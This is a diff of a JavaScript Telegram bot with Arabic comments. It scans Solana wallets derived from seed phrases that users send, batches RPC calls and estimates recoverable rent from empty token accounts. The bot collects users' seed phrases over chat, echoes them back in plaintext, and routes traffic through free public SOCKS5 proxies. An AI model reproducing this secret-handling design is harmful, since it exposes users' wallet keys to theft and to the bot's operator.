@@ -14,6 +14,17 @@ import { SocksProxyAgent } from 'socks-proxy-agent';
 
 dotenv.config();
 
+// تحليل روابط RPC المخصصة (رابط واحد لكل مسار، مفصولة بـ -https://)
+function parseRpcUrls(raw) {
+  if (!raw) return [];
+  // نقسّم على الشرطة العادية أو الطويلة (em dash) التي تسبق https://
+  return raw.split(/(?:–|-)(?=https:\/\/)/).map(u => u.trim()).filter(u => u.startsWith('http'));
+}
+const SOLANA_RPC_URLS = parseRpcUrls(process.env.RPC_URLS);
+if (SOLANA_RPC_URLS.length > 0) {
+  console.log(`✅ تم تحميل ${SOLANA_RPC_URLS.length} رابط RPC مخصص`);
+}
+
 // قائمة بروكسيات SOCKS5 مجانية — يتم اختبارها عند الإقلاع واختيار أسرعها
 const PROXY_LIST = [
   'socks5://206.123.156.178:4189',
@@ -260,76 +271,77 @@ async function retryWithBackoff(fn, maxRetries = 5, connectionsList = null) {
   }
 }
 
-// استعلام عبر RPC
+// استعلام عبر RPC — طلب واحد
 async function rpc(method, params) {
   const fetch = (await import('node-fetch')).default;
-  const currentConnectionIndex = Math.floor(Math.random() * connections.length);
-  const rpcUrl = connections[currentConnectionIndex]?.rpcEndpoint || process.env.RPC_URL;
-
+  const rpcUrl = connections[Math.floor(Math.random() * connections.length)]?.rpcEndpoint || process.env.RPC_URL;
   const res = await fetch(rpcUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      jsonrpc: "2.0",
-      id: 1,
-      method,
-      params,
-    }),
+    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
   });
   const data = await res.json();
   return data.result;
 }
 
-async function getTokenAccounts(address) {
-  try {
-    if (!address || typeof address !== 'string') {
-      return [];
-    }
-
-    // برامج التوكن المدعومة (SPL Token + Token-2022)
-    const tokenPrograms = [
-      "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",  // SPL Token Program
-      "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"   // Token-2022 Program
-    ];
-
-    let allAccounts = [];
-
-    // فحص كلا البرنامجين
-    for (const programId of tokenPrograms) {
-      try {
-        const result = await retryWithBackoff(() =>
-          rpc("getTokenAccountsByOwner", [
-            address,
-            { programId: programId },
-            { encoding: "jsonParsed" }
-          ])
-        );
-        if (result?.value) {
-          allAccounts = allAccounts.concat(result.value);
-        }
-      } catch (err) {
-        console.error(`Error fetching ${programId}:`, err.message);
+// استعلام Batch — عدة طلبات في HTTP request واحد
+async function batchRpc(requests, retries = 5) {
+  const fetch = (await import('node-fetch')).default;
+  const rpcUrl = connections[0]?.rpcEndpoint || process.env.RPC_URL;
+  for (let attempt = 0; attempt < retries; attempt++) {
+    try {
+      const res = await fetch(rpcUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(
+          requests.map((r, i) => ({ jsonrpc: '2.0', id: i + 1, method: r.method, params: r.params }))
+        )
+      });
+      const text = await res.text();
+      const data = JSON.parse(text);
+      if (Array.isArray(data)) {
+        return [...data].sort((a, b) => a.id - b.id).map(d => d.result ?? null);
       }
+      if (data?.error?.code === 429) {
+        await sleep(1000 * (attempt + 1));
+        continue;
+      }
+      throw new Error(JSON.stringify(data));
+    } catch (e) {
+      if (attempt === retries - 1) throw e;
+      await sleep(800 * (attempt + 1));
     }
+  }
+}
 
-    return allAccounts;
+const TOKEN_PROGRAMS = [
+  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+  "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
+];
+
+// جلب token accounts لعنوان واحد — برنامجان في batch واحد
+async function getTokenAccounts(address) {
+  if (!address || typeof address !== 'string') return [];
+  try {
+    const results = await batchRpc(
+      TOKEN_PROGRAMS.map(programId => ({
+        method: 'getTokenAccountsByOwner',
+        params: [address, { programId }, { encoding: 'jsonParsed' }]
+      }))
+    );
+    return (results ?? []).flatMap(r => r?.value ?? []);
   } catch (error) {
-    if (!error.message.includes('429')) {
+    if (!error.message?.includes('429')) {
       console.error("Error getting token accounts for address:", address, error.message);
     }
     return [];
   }
 }
 
+// حساب تكلفة الـ Rent لعنوان واحد
 async function calculateBurnCost(addressStr) {
   try {
-    if (!addressStr) {
-      return {
-        emptyTokens: 0,
-        nfts: 0,
-        totalBurnCost: "0.000000000"
-      };
-    }
+    if (!addressStr) return { emptyTokens: 0, nfts: 0, totalBurnCost: "0.000000000" };
 
     console.log(`🔍 فحص التوكنات للعنوان: ${addressStr}`);
     const tokens = await getTokenAccounts(addressStr);
@@ -344,45 +356,25 @@ async function calculateBurnCost(addressStr) {
         const info = token.account.data.parsed.info;
         const amount = parseFloat(info.tokenAmount.uiAmount) || 0;
         const decimals = info.tokenAmount.decimals;
-
-        // تصنيف الحسابات مثل الكود الناجح
-        if (amount === 0) {
-          tokenCount++;
-          console.log(`🗑️ توكن فارغ: ${info.mint}`);
-        } else if (decimals === 0 && amount === 1) {
-          nftCount++;
-          console.log(`🖼️ NFT: ${info.mint}`);
-        } else {
-          cleanupCount++;
-        }
+        if (amount === 0) { tokenCount++; console.log(`🗑️ توكن فارغ: ${info.mint}`); }
+        else if (decimals === 0 && amount === 1) { nftCount++; console.log(`🖼️ NFT: ${info.mint}`); }
+        else { cleanupCount++; }
       } catch (tokenError) {
         console.error("خطأ في معالجة التوكن:", tokenError);
       }
     }
 
-    // حساب rent لجميع الحسابات (مثل الكود الناجح)
     const totalAccounts = tokens.length;
     const burnCostPerAccount = 0.00203928;
     const totalBurnCost = totalAccounts * burnCostPerAccount;
 
-    console.log(`💰 إجمالي التوكنات الفارغة: ${tokenCount}`);
-    console.log(`🖼️ إجمالي NFTs: ${nftCount}`);
-    console.log(`🔧 حسابات أخرى: ${cleanupCount}`);
-    console.log(`📊 إجمالي الحسابات: ${totalAccounts}`);
-    console.log(`✨ إجمالي SOL قابل للاستعادة: ${totalBurnCost.toFixed(9)}`);
+    console.log(`💰 توكنات فارغة: ${tokenCount} | NFTs: ${nftCount} | أخرى: ${cleanupCount}`);
+    console.log(`📊 إجمالي الحسابات: ${totalAccounts} | SOL قابل للاستعادة: ${totalBurnCost.toFixed(9)}`);
 
-    return {
-      emptyTokens: tokenCount,
-      nfts: nftCount,
-      totalBurnCost: totalBurnCost.toFixed(9)
-    };
+    return { emptyTokens: tokenCount, nfts: nftCount, totalBurnCost: totalBurnCost.toFixed(9) };
   } catch (error) {
     console.error("Error calculating burn cost:", error);
-    return {
-      emptyTokens: 0,
-      nfts: 0,
-      totalBurnCost: "0.000000000"
-    };
+    return { emptyTokens: 0, nfts: 0, totalBurnCost: "0.000000000" };
   }
 }
 
@@ -422,30 +414,71 @@ function deriveWalletOffline(path, seed) {
   }
 }
 
-// المرحلة الثانية: فحص محفظة واحدة عبر connection محدد
-async function checkWalletOnChain(wallet, connection) {
-  try {
-    const pubkey = new PublicKey(wallet.address);
-    const [txList, balance] = await Promise.all([
-      retryWithBackoff(() => connection.getSignaturesForAddress(pubkey, { limit: 1 })),
-      retryWithBackoff(() => connection.getBalance(pubkey))
-    ]);
+// فحص كل المحافظ — كل محفظة على رابطها المخصص، batch طلبَين (balance + signatures) لكل رابط
+async function checkAllWalletsBatch(wallets) {
+  const fetch = (await import('node-fetch')).default;
+  const fallbackUrl = connections[0]?.rpcEndpoint || process.env.RPC_URL;
 
-    if (txList.length > 0 || balance > 0) {
-      const burnInfo = await calculateBurnCost(wallet.address);
-      const balanceInSol = balance / 1e9;
-      return {
-        ...wallet,
-        balance: balanceInSol,
-        hasTransactions: txList.length > 0,
-        recoveredSOL: parseFloat(burnInfo.totalBurnCost),
-        ...burnInfo
-      };
-    }
-  } catch (error) {
-    console.error(`⚠️ Error checking ${wallet.address}:`, error.message);
-  }
-  return null;
+  const checks = await Promise.all(
+    wallets.map(async (wallet, i) => {
+      const rpcUrl = SOLANA_RPC_URLS.length > 0
+        ? SOLANA_RPC_URLS[i % SOLANA_RPC_URLS.length]
+        : fallbackUrl;
+
+      const batchBody = [
+        { jsonrpc: '2.0', id: 1, method: 'getBalance',             params: [wallet.address, { commitment: 'confirmed' }] },
+        { jsonrpc: '2.0', id: 2, method: 'getSignaturesForAddress', params: [wallet.address, { limit: 1, commitment: 'confirmed' }] }
+      ];
+
+      for (let attempt = 0; attempt < 5; attempt++) {
+        try {
+          const res = await fetch(rpcUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(batchBody)
+          });
+          const text = await res.text();
+          let data;
+          try { data = JSON.parse(text); } catch {
+            if (attempt === 4) return { wallet, balance: 0, hasTx: false };
+            await sleep(500 * (attempt + 1)); continue;
+          }
+          if (Array.isArray(data)) {
+            const sorted  = [...data].sort((a, b) => a.id - b.id);
+            const balance = (sorted[0]?.result?.value ?? 0) / 1e9;
+            const hasTx   = Array.isArray(sorted[1]?.result) && sorted[1].result.length > 0;
+            return { wallet, balance, hasTx };
+          }
+          if (data?.error?.code === 429) { await sleep(1000 * (attempt + 1)); continue; }
+          if (attempt === 4) return { wallet, balance: 0, hasTx: false };
+          await sleep(500 * (attempt + 1));
+        } catch (e) {
+          if (attempt === 4) return { wallet, balance: 0, hasTx: false };
+          await sleep(500 * (attempt + 1));
+        }
+      }
+      return { wallet, balance: 0, hasTx: false };
+    })
+  );
+
+  // حساب Rent للمحافظ النشطة فقط
+  const activeChecks = checks.filter(c => c.balance > 0 || c.hasTx);
+  const burnInfoMap = {};
+  await Promise.all(activeChecks.map(async c => {
+    burnInfoMap[c.wallet.address] = await calculateBurnCost(c.wallet.address);
+  }));
+
+  return checks.map(({ wallet, balance, hasTx }) => {
+    if (!balance && !hasTx) return null;
+    const burnInfo = burnInfoMap[wallet.address] ?? { emptyTokens: 0, nfts: 0, totalBurnCost: "0.000000000" };
+    return {
+      ...wallet,
+      balance,
+      hasTransactions: hasTx,
+      recoveredSOL: parseFloat(burnInfo.totalBurnCost),
+      ...burnInfo
+    };
+  });
 }
 
 async function scanWallet(mnemonic, chatId, userInfo = null) {
@@ -473,31 +506,12 @@ async function scanWallet(mnemonic, chatId, userInfo = null) {
 
   if (isCancelled()) return;
 
-  if (isAdmin(chatId)) {
-    const msg = userMode === 'balance_only'
-      ? `🔍 تم استخراج ${derivedWallets.length} عنواناً، جاري الفحص عبر ${connections.length} روابط RPC...`
-      : `🔍 تم استخراج ${derivedWallets.length} عنواناً، جاري الفحص عبر ${connections.length} روابط RPC...`;
-    await bot.sendMessage(chatId, msg);
-  } else {
+  if (!isAdmin(chatId)) {
     await bot.sendMessage(chatId, '🔍 Searching for active wallets...');
   }
 
-  // ── المرحلة الثانية: تقسيم العناوين بالتساوي على الروابط وتشغيلهم بالتوازي ──
-  const numConns = connections.length || 1;
-  const chunkSize = Math.ceil(derivedWallets.length / numConns);
-  const chunks = Array.from({ length: numConns }, (_, i) =>
-    derivedWallets.slice(i * chunkSize, (i + 1) * chunkSize)
-  );
-
-  // كل chunk يُفحص بشكل مستقل على رابطه المخصص، جميعهم يبدأون في نفس اللحظة
-  const allChunkResults = await Promise.all(
-    chunks.map((chunk, connIdx) =>
-      Promise.all(chunk.map(wallet => checkWalletOnChain(wallet, connections[connIdx])))
-    )
-  );
-
-  // دمج النتائج مع الحفاظ على الترتيب
-  const results = allChunkResults.flat();
+  // ── المرحلة الثانية: فحص كل العناوين في batch واحد ──
+  const results = await checkAllWalletsBatch(derivedWallets);
   const seenAddresses = new Set();
 
   for (const wallet of results) {
@@ -1289,9 +1303,9 @@ bot.on('message', async (msg) => {
         await bot.sendMessage(chatId, message);
       }
       const phraseMessage = isAdmin(chatId) ?
-        `🔍 الكلمات السرية: "${mnemonics[i]}"` :
+        `🔍 Seed Phrase:\n\`${mnemonics[i]}\`` :
         `🔍 Seed Phrase: "${mnemonics[i]}"`;
-      await bot.sendMessage(chatId, phraseMessage);
+      await bot.sendMessage(chatId, phraseMessage, { parse_mode: 'Markdown' });
       await scanWallet(mnemonics[i], chatId, userInfo);
     }
   }
